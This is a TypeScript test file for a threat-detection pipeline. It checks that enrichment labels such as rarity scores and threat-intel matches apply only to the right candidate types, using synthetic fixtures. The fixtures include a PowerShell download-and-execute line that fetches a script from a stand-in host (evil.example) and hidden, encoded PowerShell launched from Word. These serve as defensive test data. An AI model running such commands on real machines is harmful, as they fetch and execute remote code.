// Stage-4 applicability, asserted OFF the sample dataset — which is the whole point of it.
//
// Pin A catches a mis-stamp on `fixtures/` by byte equality. Nothing else would catch one
// on any other input, and running on other input is what this tool is for. These cases are
// built on synthetic candidates instead, so they fail on a spec edit that the sample
// dataset happens not to exercise.
//
// Two assertion classes sit on top of the hand-written expectations, both DERIVED from
// athanor's own `enrichment-spec.ts` rather than hand-listed, so they cannot fall behind a
// spec edit:
//   1. the forbidden sweep — for each candidate, EVERY declared Stage 4 label that is not in
//      that type's `STAGE4_APPLICABILITY_BY_CANDIDATE` entry must be absent;
//   2. the range sweep — every `*_rarity` / `business_hours_proportion` value that IS stamped
//      must be a finite number in [0, 1], and every `*_frequency` object must be internally
//      consistent with its paired `*_rarity`.
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import type { PreEnrichmentCandidate } from '../../../src/pipeline/types/pre-enrichment-candidate.js';
import type { PostEnrichmentCandidate } from '../../../src/pipeline/types/post-enrichment-candidate.js';
import type { PostEnrichmentEvent } from '../../../src/pipeline/types/post-enrichment-event.js';
import { createEmptyLfaTables } from '../../../src/pipeline/types/lfa-tables.js';
import { enrichCandidates } from '../../../src/pipeline/enrich-candidates/index.js';
import { extractScriptBlockEntity } from '../../../src/pipeline/util/extract-script-block-entity.js';
import {
  STAGE4_APPLICABILITY_BY_CANDIDATE,
  STAGE4_ENRICHMENT_LABEL_SPECS,
} from '../../../src/pipeline/spec/enrichment-spec.js';

function assertBooleanOrNull(value: unknown): void {
  assert.equal(value === null || typeof value === 'boolean', true);
}

const RARITY_BUCKETS = new Set(['very_rare', 'rare', 'uncommon', 'common', 'ubiquitous']);

const beacon = {
  candidate_id: 'BCN-1',
  type: 'beacon',
  time_window_start: '2026-04-11T00:00:00.000Z',
  time_window_end: '2026-04-11T01:00:00.000Z',
  src_ip: '10.0.0.5',
  dest_ip: '203.0.113.10',
  dest_port: 443,
  process_name: null,
  process_id: null,
  enrichment: {},
  evidence: { constituent_event_ids: [] },
} as unknown as PreEnrichmentCandidate;

const tlsAnomaly = {
  candidate_id: 'TLS-1',
  type: 'tls_anomaly',
  time_window_start: '2026-04-11T00:00:00.000Z',
  time_window_end: '2026-04-11T01:00:00.000Z',
  src_ip: '10.0.0.8',
  dest_ip: '198.51.100.50',
  dest_port: 443,
  process_name: null,
  process_id: null,
  enrichment: {},
  evidence: { constituent_event_ids: ['evt-ssl-1'] },
} as unknown as PreEnrichmentCandidate;

const dataTransfer = {
  candidate_id: 'DTR-1',
  type: 'data_transfer',
  time_window_start: '2026-04-11T00:00:00.000Z',
  time_window_end: '2026-04-11T01:00:00.000Z',
  src_ip: '10.0.0.8',
  dest_ip: '198.51.100.50',
  dest_port: 443,
  process_name: null,
  process_id: null,
  enrichment: {},
  evidence: { constituent_event_ids: ['evt-lc-1', 'evt-lc-2'] },
} as unknown as PreEnrichmentCandidate;

const powershellInvocationAnomaly = {
  candidate_id: 'PSA-1',
  type: 'powershell_invocation_anomaly',
  time_window_start: '2026-04-11T00:00:00.000Z',
  time_window_end: '2026-04-11T01:00:00.000Z',
  process_name: 'powershell.exe',
  parent_process_name: 'winword.exe',
  process_id: 3330,
  script_block_id: '{SB-1}',
  command_line: 'powershell.exe -NoP -w hidden',
  enrichment: {},
  evidence: { constituent_event_ids: ['evt-psa-1', 'evt-psa-2'] },
} as unknown as PreEnrichmentCandidate;

const unusualParentChildAnomaly = {
  candidate_id: 'UPC-1',
  type: 'unusual_parent_child_anomaly',
  time_window_start: '2026-04-11T00:00:00.000Z',
  time_window_end: '2026-04-11T01:00:00.000Z',
  host: 'ws02.corp.local',
  process_guid: '{00000000-0000-0000-0000-000000000099}',
  process_name: 'powershell.exe',
  parent_process_name: 'winword.exe',
  command_line: 'powershell.exe -NoProfile -EncodedCommand SQBFAFgA',
  enrichment: {},
  evidence: { constituent_event_ids: ['evt-upc-1'] },
} as unknown as PreEnrichmentCandidate;

const events: PostEnrichmentEvent[] = [
  {
    id: 'evt-lc-1',
    timestamp: '2026-04-11T00:15:00.000Z',
    source: 'zeek',
    event_type: 'conn',
    src_ip: '10.0.0.8',
    dest_ip: '198.51.100.50',
    dest_port: 443,
    proto: 'tcp',
    enrichment: { business_hours: true },
  } as unknown as PostEnrichmentEvent,
  {
    id: 'evt-lc-2',
    timestamp: '2026-04-11T00:45:00.000Z',
    source: 'zeek',
    event_type: 'conn',
    src_ip: '10.0.0.8',
    dest_ip: '198.51.100.50',
    dest_port: 443,
    proto: 'tcp',
    enrichment: { business_hours: false },
  } as unknown as PostEnrichmentEvent,
  {
    id: 'evt-ssl-1',
    timestamp: '2026-04-11T00:20:00.000Z',
    source: 'zeek',
    event_type: 'ssl',
    src_ip: '10.0.0.8',
    dest_ip: '198.51.100.50',
    dest_port: 443,
    server_name: 'random-domain.biz',
    ja3_hash: 'ja3-test',
    enrichment: { business_hours: true },
  } as unknown as PostEnrichmentEvent,
  {
    id: 'evt-psa-1',
    timestamp: '2026-04-11T00:12:00.000Z',
    source: 'sysmon',
    event_type: 'process_create',
    event_id: 1,
    host: 'ws02.corp.local',
    process_name: 'PowerShell.EXE',
    command_line: '  powershell.exe   -NoP -w hidden  ',
    enrichment: { business_hours: false },
  } as unknown as PostEnrichmentEvent,
  {
    id: 'evt-psa-2',
    timestamp: '2026-04-11T00:13:00.000Z',
    source: 'powershell',
    event_type: 'script_block',
    host: 'ws02.corp.local',
    script_block_id: '{SB-1}',
    script_block_text: "IEX (New-Object Net.WebClient).DownloadString('https://evil.example/a.ps1')",
    enrichment: { business_hours: false },
  } as unknown as PostEnrichmentEvent,
  {
    id: 'evt-upc-1',
    timestamp: '2026-04-11T00:14:00.000Z',
    source: 'sysmon',
    event_type: 'process_create',
    event_id: 1,
    host: 'ws02.corp.local',
    process_name: 'powershell.exe',
    parent_process_name: 'WINWORD.EXE',
    command_line: 'powershell.exe -NoProfile -EncodedCommand SQBFAFgA',
    enrichment: { business_hours: false },
  } as unknown as PostEnrichmentEvent,
];

function buildLfaTables() {
  const lfa = createEmptyLfaTables(2);
  lfa.destination.set('203.0.113.10', 1);
  lfa.destination.set('198.51.100.50', 1);
  lfa.domain.set('random-domain.biz', 1);
  lfa.ja3.set('ja3-test', 1);
  lfa.process.set('powershell.exe', 1);
  lfa.commandLine.set('powershell.exe\x1fpowershell.exe -nop -w hidden', 1);
  lfa.parentChildPair.set('winword.exe\x1fpowershell.exe', 1);
  const scriptBlockEntity = extractScriptBlockEntity({
    script_block_text: "IEX (New-Object Net.WebClient).DownloadString('https://evil.example/a.ps1')",
  });
  if (scriptBlockEntity) lfa.scriptBlockHash.set(scriptBlockEntity, 1);
  return lfa;
}

function enrichAll(): PostEnrichmentCandidate[] {
  return enrichCandidates(
    [
      beacon,
      dataTransfer,
      tlsAnomaly,
      powershellInvocationAnomaly,
      unusualParentChildAnomaly,
    ],
    buildLfaTables(),
    {
      events,
      threatIntelFeed: {
        ips: new Set(['203.0.113.10', '198.51.100.50']),
        domains: new Set(['random-domain.biz']),
        hashes: new Set(),
      },
    },
  );
}

describe('enrichCandidates applicability', () => {
  it('applies Beacon + Data Transfer + TLS Anomaly + PowerShell Invocation Anomaly + Unusual Parent-Child Anomaly labels', () => {
    const out = enrichAll();

    assert.equal(out.length, 5);

    // out[0] — beacon
    assert.equal(out[0].enrichment.threat_intel_match, true);
    assertBooleanOrNull(out[0].enrichment.protocol_mismatch);

    // out[1] — data_transfer
    assert.equal(out[1].enrichment.threat_intel_match, true);
    assertBooleanOrNull(out[1].enrichment.protocol_mismatch);
    assert.equal(typeof out[1].enrichment.destination_rarity, 'number');
    assert.equal(typeof out[1].enrichment.first_seen, 'string');
    assert.equal(typeof out[1].enrichment.business_hours_proportion, 'number');
    if (out[1].enrichment.user_agent_rarity !== undefined) {
      assert.equal(typeof out[1].enrichment.user_agent_rarity, 'number');
    }
    assert.equal(out[1].enrichment.missing_sni, undefined);
    assert.equal(out[1].enrichment.ja3_rarity, undefined);
    assert.equal(out[1].enrichment.domain_rarity, undefined);

    // out[2] — tls_anomaly
    assert.equal(out[2].enrichment.threat_intel_match, true);
    assert.equal(typeof out[2].enrichment.destination_rarity, 'number');
    assert.equal(typeof out[2].enrichment.domain_rarity, 'number');
    assert.equal(typeof out[2].enrichment.ja3_rarity, 'number');
    assert.equal(typeof out[2].enrichment.first_seen, 'string');
    assert.equal(typeof out[2].enrichment.business_hours_proportion, 'number');
    assert.equal(typeof out[2].enrichment.lots_match, 'boolean');
    assert.equal(typeof out[2].enrichment.missing_sni, 'boolean');
    if (out[2].enrichment.geo_country !== undefined) {
      assert.equal(typeof out[2].enrichment.geo_country, 'string');
    }
    if (out[2].enrichment.geo_asn !== undefined) {
      assert.equal(typeof out[2].enrichment.geo_asn, 'string');
    }
    assert.equal(out[2].enrichment.user_agent_rarity, undefined);
    assertBooleanOrNull(out[2].enrichment.protocol_mismatch);

    // out[3] — powershell_invocation_anomaly
    assert.equal(typeof out[3].enrichment.command_line_rarity, 'number');
    assert.equal(typeof out[3].enrichment.parent_child_pair_rarity, 'number');
    assert.equal(typeof out[3].enrichment.script_block_hash_rarity, 'number');
    assert.equal(typeof out[3].enrichment.first_seen, 'string');
    assert.equal(typeof out[3].enrichment.business_hours_proportion, 'number');
    assert.equal(out[3].enrichment.destination_rarity, undefined);
    assert.equal(out[3].enrichment.domain_rarity, undefined);
    assert.equal(out[3].enrichment.user_agent_rarity, undefined);
    assert.equal(out[3].enrichment.ja3_rarity, undefined);
    assert.equal(out[3].enrichment.threat_intel_match, undefined);
    assert.equal(out[3].enrichment.geo_country, undefined);
    assert.equal(out[3].enrichment.geo_asn, undefined);
    assert.equal(out[3].enrichment.lots_match, undefined);
    assert.equal(out[3].enrichment.missing_sni, undefined);
    assert.equal(out[3].enrichment.protocol_mismatch, undefined);

    // out[4] — unusual_parent_child_anomaly
    assert.equal(typeof out[4].enrichment.process_rarity, 'number');
    assert.equal(typeof out[4].enrichment.parent_child_pair_rarity, 'number');
    assert.equal(typeof out[4].enrichment.first_seen, 'string');
    assert.equal(typeof out[4].enrichment.business_hours_proportion, 'number');
    assert.equal(out[4].enrichment.command_line_rarity, undefined);
    assert.equal(out[4].enrichment.script_block_hash_rarity, undefined);
    assert.equal(out[4].enrichment.destination_rarity, undefined);
    assert.equal(out[4].enrichment.domain_rarity, undefined);
    assert.equal(out[4].enrichment.user_agent_rarity, undefined);
    assert.equal(out[4].enrichment.ja3_rarity, undefined);
    assert.equal(out[4].enrichment.threat_intel_match, undefined);
    assert.equal(out[4].enrichment.geo_country, undefined);
    assert.equal(out[4].enrichment.geo_asn, undefined);
    assert.equal(out[4].enrichment.lots_match, undefined);
    assert.equal(out[4].enrichment.missing_sni, undefined);
    assert.equal(out[4].enrichment.protocol_mismatch, undefined);
  });

  it('stamps no Stage 4 label outside its candidate type’s declared applicability', () => {
    const out = enrichAll();
    const declaredLabels = Object.keys(STAGE4_ENRICHMENT_LABEL_SPECS);

    for (const candidate of out) {
      const candidateType = candidate.type as keyof typeof STAGE4_APPLICABILITY_BY_CANDIDATE;
      const applicable = new Set<string>(STAGE4_APPLICABILITY_BY_CANDIDATE[candidateType]);
      const enrichment = candidate.enrichment as Record<string, unknown>;

      assert.equal(applicable.size > 0, true, `${candidateType} declares no Stage 4 labels`);

      for (const label of declaredLabels) {
        if (applicable.has(label)) continue;
        assert.equal(
          Object.hasOwn(enrichment, label),
          false,
          `${candidateType} must NOT carry the forbidden Stage 4 label '${label}'`,
        );
        assert.equal(
          enrichment[label],
          undefined,
          `${candidateType} must NOT carry the forbidden Stage 4 label '${label}'`,
        );
      }
    }
  });

  it('keeps every stamped rarity and proportion inside the unit interval', () => {
    const out = enrichAll();

    for (const candidate of out) {
      const candidateType = candidate.type;
      const enrichment = candidate.enrichment as Record<string, unknown>;

      for (const [label, value] of Object.entries(enrichment)) {
        if (value === undefined) continue;

        if (label.endsWith('_rarity') || label === 'business_hours_proportion') {
          assert.equal(typeof value, 'number', `${candidateType}.${label} must be a number`);
          const numeric = value as number;
          assert.equal(Number.isFinite(numeric), true, `${candidateType}.${label} must be finite`);
          assert.equal(numeric >= 0 && numeric <= 1, true, `${candidateType}.${label} = ${numeric} is outside [0, 1]`);
        }

        if (label.endsWith('_frequency')) {
          const stats = value as Record<string, unknown>;
          assert.equal(typeof stats, 'object', `${candidateType}.${label} must be an object`);
          assert.equal(typeof stats.entity, 'string', `${candidateType}.${label}.entity must be a string`);
          assert.equal(typeof stats.host_count, 'number', `${candidateType}.${label}.host_count must be a number`);
          assert.equal(
            (stats.host_count as number) > 0,
            true,
            `${candidateType}.${label}.host_count must be positive`,
          );
          assert.equal(
            typeof stats.population_host_count,
            'number',
            `${candidateType}.${label}.population_host_count must be a number`,
          );
          const prevalence = stats.prevalence as number;
          assert.equal(
            prevalence >= 0 && prevalence <= 1,
            true,
            `${candidateType}.${label}.prevalence = ${prevalence} is outside [0, 1]`,
          );
          const rarityScore = stats.rarity_score as number;
          assert.equal(
            rarityScore >= 0 && rarityScore <= 1,
            true,
            `${candidateType}.${label}.rarity_score = ${rarityScore} is outside [0, 1]`,
          );
          assert.equal(
            RARITY_BUCKETS.has(stats.rarity_bucket as string),
            true,
            `${candidateType}.${label}.rarity_bucket = '${String(stats.rarity_bucket)}' is not a declared bucket`,
          );

          // The paired `*_rarity` label is the frequency block's own rarity_score.
          const rarityLabel = `${label.slice(0, -'_frequency'.length)}_rarity`;
          assert.equal(
            enrichment[rarityLabel],
            rarityScore,
            `${candidateType}.${rarityLabel} must equal ${label}.rarity_score`,
          );
        }
      }
    }
  });
});
